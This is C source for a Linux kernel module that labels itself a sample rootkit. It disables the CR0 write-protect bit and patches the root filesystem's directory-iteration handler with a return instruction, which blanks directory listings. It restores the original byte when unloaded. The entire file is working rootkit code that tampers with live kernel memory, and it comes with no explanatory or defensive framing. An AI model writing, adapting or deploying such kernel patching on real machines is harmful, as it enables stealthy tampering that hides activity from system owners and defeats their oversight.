#include "linux/printk.h"
#include "linux/types.h"
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Krzysztof Zdulski");
MODULE_DESCRIPTION("Sample rootkit - module list");
MODULE_VERSION("0.01");

static uint8_t org_fop;

static inline void _write_cr0(unsigned long val)
{
    asm volatile("mov %0,%%cr0" : "+r"(val) : : "memory");
}

struct file_operations *get_fop(const char *path)
{
    struct file *file;
    struct file_operations *ret;

    if ((file = filp_open(path, O_RDONLY, 0)) == NULL) {
        return NULL;
    }

    ret = (struct file_operations *)file->f_op;
    filp_close(file, 0);

    return ret;
}

static int __init lkm_example_init(void)
{
    struct file_operations *fops;

    printk(KERN_INFO "loading module list module");

    fops = get_fop("/");
    // Simulate hook (ret)
    org_fop = *((uint8_t *)fops->iterate_shared);
    _write_cr0(native_read_cr0() & (~0x10000));
    *((uint8_t *)fops->iterate_shared) = 0xc3;
    _write_cr0(native_read_cr0() | 0x10000);

    return 0;
}

static void __exit lkm_example_exit(void)
{
    struct file_operations *fops;

    printk(KERN_INFO "unloading module list module");

    fops = get_fop("/");
    _write_cr0(native_read_cr0() & (~0x10000));
    *((uint8_t *)fops->iterate_shared) = org_fop;
    _write_cr0(native_read_cr0() | 0x10000);
}

module_init(lkm_example_init);
module_exit(lkm_example_exit);
